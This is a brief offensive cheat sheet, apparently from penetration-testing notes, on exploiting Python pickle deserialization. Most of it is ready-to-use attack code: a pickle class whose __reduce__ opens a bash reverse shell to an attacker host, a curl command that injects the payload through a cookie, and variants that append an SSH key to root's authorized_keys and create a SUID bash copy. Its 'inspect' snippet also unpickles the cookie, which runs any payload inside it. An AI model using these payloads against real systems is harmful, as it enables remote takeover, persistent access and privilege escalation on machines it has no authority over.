# Python Pickle Deserialization RCE

When an app deserializes untrusted pickle data (cookie, upload, API param), `__reduce__` executes arbitrary code.

**Craft malicious pickle payload:**
```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

**Inject into cookie (common pattern — Flask session or custom cookie):**
```bash
# If cookie is base64-encoded pickle:
curl http://<TARGET>/page -H "Cookie: session=<base64_payload>"
```

**Identify pickle in cookie:** starts with `\x80\x02` (pickle protocol 2) or `gASV` (base64 of protocol 5).

**Decode existing cookie to inspect:**
```python
import pickle, base64
pickle.loads(base64.b64decode('<cookie_value>'))
```

**Useful payload variants:**
```python
# Write SSH key:
return (os.system, ('mkdir -p /root/.ssh && echo "<pubkey>" >> /root/.ssh/authorized_keys',))

# SUID bash:
return (os.system, ('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash',))
```
